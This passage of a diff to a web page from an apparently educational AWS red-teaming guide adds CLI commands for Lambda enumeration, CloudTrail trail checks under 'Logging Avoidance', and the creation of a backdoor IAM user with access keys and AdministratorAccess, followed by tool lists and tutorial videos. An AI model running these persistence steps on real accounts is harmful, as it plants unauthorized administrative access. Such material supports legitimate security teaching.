+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c1"># Get function details</span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>aws<span class="w"> </span>lambda<span class="w"> </span>get-function<span class="w"> </span>--function-name<span class="w"> </span><span class="o">[</span><span class="k">function</span>-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="c1"># List function policies</span>
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>aws<span class="w"> </span>lambda<span class="w"> </span>get-policy<span class="w"> </span>--function-name<span class="w"> </span><span class="o">[</span><span class="k">function</span>-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span></code></pre></div>
+<h2 id="defense-evasion-persistence">Defense Evasion &amp; Persistence<a class="headerlink" href="#defense-evasion-persistence" title="Permanent link">&para;</a></h2>
+<h3 id="logging-avoidance">Logging Avoidance<a class="headerlink" href="#logging-avoidance" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># Identify CloudTrail trails</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>aws<span class="w"> </span>cloudtrail<span class="w"> </span>describe-trails<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c1"># Check if trails are logging</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>aws<span class="w"> </span>cloudtrail<span class="w"> </span>get-trail-status<span class="w"> </span>--name<span class="w"> </span><span class="o">[</span>trail-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span></code></pre></div>
+<h3 id="backdoor-users">Backdoor Users<a class="headerlink" href="#backdoor-users" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1"># Create new user with access keys</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>aws<span class="w"> </span>iam<span class="w"> </span>create-user<span class="w"> </span>--user-name<span class="w"> </span><span class="o">[</span>backdoor-user<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>admin-profile<span class="o">]</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>aws<span class="w"> </span>iam<span class="w"> </span>create-access-key<span class="w"> </span>--user-name<span class="w"> </span><span class="o">[</span>backdoor-user<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>admin-profile<span class="o">]</span>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="c1"># Attach administrative policies</span>
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>aws<span class="w"> </span>iam<span class="w"> </span>attach-user-policy<span class="w"> </span>--user-name<span class="w"> </span><span class="o">[</span>backdoor-user<span class="o">]</span><span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::aws:policy/AdministratorAccess<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>admin-profile<span class="o">]</span>
+</span></code></pre></div>
+<h2 id="useful-tools-resources">Useful Tools &amp; Resources<a class="headerlink" href="#useful-tools-resources" title="Permanent link">&para;</a></h2>
+<h3 id="command-line-tools">Command Line Tools<a class="headerlink" href="#command-line-tools" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>awscli</strong> - Official AWS CLI</li>
+<li><strong>aws-vault</strong> - Secure credential storage</li>
+<li><strong>jq</strong> - JSON processor for parsing AWS output</li>
+<li><strong>s3cmd</strong> - Advanced S3 operations</li>
+</ul>
+<h3 id="security-scanners">Security Scanners<a class="headerlink" href="#security-scanners" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Pacu</strong> - AWS exploitation framework</li>
+<li><strong>ScoutSuite</strong> - Multi-cloud security auditing</li>
+<li><strong>CloudSploit</strong> - CSPM security checks</li>
+<li><strong>TruffleHog</strong> - Secret scanning in cloud environments</li>
+</ul>
+<h3 id="learning-resources">Learning Resources<a class="headerlink" href="#learning-resources" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>AWS Documentation</strong> - Official service documentation</li>
+<li><strong>Rhino Security Labs</strong> - AWS security research</li>
+<li><strong>MITRE ATT&amp;CK Cloud Matrix</strong> - TTPs for cloud environments</li>
+<li><strong>Cloud Security Alliance</strong> - Cloud security guidelines</li>
+</ul>
+<hr />
+<details class="note">
+<summary>Some Good Youtube Tutorials</summary>
+<p><iframe width="748" height="400" src="https://www.youtube.com/embed/OCCvvesay9M" title="1. Introduction to AWS Red Teaming" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe></p>
+<p><iframe width="707" height="480" src="https://www.youtube.com/embed/ZGDHqKxATeQ" title="2. AWS Cloud Authentication" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe></p>
+<p><iframe width="707" height="480" src="https://www.youtube.com/embed/JD2WGwTcgSc" title="3. AWS Cloud Core Services Enumeration" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe></p>
+<p><iframe width="707" height="480" src="https://www.youtube.com/embed/X20KVCj6wcQ" title="4. AWS Cloud Red Team Operations" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe></p>
+</details>
 
 
 
@@ -2613,7 +3489,7 @@
       <nav class="md-footer__inner md-grid" aria-label="Footer" >
         
           
-          <a href="./.." class="md-footer__link md-footer__link--prev" aria-label="Previous: Home">
+          <a href="../introduction/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Introduction">
             <div class="md-footer__button md-icon">
               
               <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
@@ -2623,20 +3499,20 @@
                 Previous
               </span>
               <div class="md-ellipsis">
-                Home
+                Introduction
               </div>
             </div>
           </a>
         
         
           
-          <a href="../docker/" class="md-footer__link md-footer__link--next" aria-label="Next: Intro">
+          <a href="../azure/" class="md-footer__link md-footer__link--next" aria-label="Next: Azure">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 Next
               </span>
               <div class="md-ellipsis">
-                Intro
+                Azure
               </div>
             </div>
             <div class="md-footer__button md-icon">
@@ -2791,10 +3667,10 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate":null,"base":"..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.footer","navigation.indexes","navigation.instant","navigation.instant.prefetch","navigation.instant.progress","navigation.path","navigation.top","navigation.tracking","search.highlight"],"search":"../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+      <script id="__config" type="application/json">{"annotate":null,"base":"../..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.footer","navigation.indexes","navigation.instant","navigation.instant.prefetch","navigation.instant.progress","navigation.path","navigation.top","navigation.tracking","search.highlight"],"search":"../../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
     
     
-      <script src="../assets/javascripts/bundle.c2b142ea.min.js"></script>
+      <script src="../../assets/javascripts/bundle.c2b142ea.min.js"></script>
       
     
   </body>
